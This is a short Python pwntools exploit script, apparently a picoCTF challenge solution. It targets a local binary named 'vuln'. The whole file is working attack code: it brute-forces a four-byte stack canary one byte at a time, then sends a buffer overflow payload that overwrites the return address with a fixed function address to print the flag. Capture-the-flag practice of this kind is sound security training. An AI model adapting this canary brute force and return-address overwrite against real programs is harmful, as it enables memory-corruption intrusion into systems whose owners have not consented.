#!/usr/bin/env python
import pwn


def connect():
    return pwn.process("./vuln")
    # return pwn.remote("saturn.picoctf.net", 57890)


def b(x):
    return x.to_bytes(4, "little")


offset = 84
canary_offset = 64


current = b""

# canary brute force (first byte)
for i in range(4):
    for j in range(0xFF):
        io = connect()

        payload = b"A" * canary_offset
        payload += current
        payload += j.to_bytes(1, "little")

        io.sendline(str(65 + i).encode())
        io.sendline(payload)

        resp = io.recvall(0.5)

        io.close()

        if b"Stack Smashing Detected" not in resp:
            current += j.to_bytes(1, "little")
            print(current)
            break

canary = current

pwn.log.success("Canary: " + canary.hex())

io = connect()

payload = b"A" * canary_offset
payload += canary
payload += b"A" * (offset - canary_offset - len(canary))
payload += b(0x08049336)

pwn.log.info("Payload: " + payload.hex())

io.sendline(b"1000")
io.sendline(payload)

io.recvuntil(b"Now Where's the Flag?\n")
print(io.recvline().strip().decode())
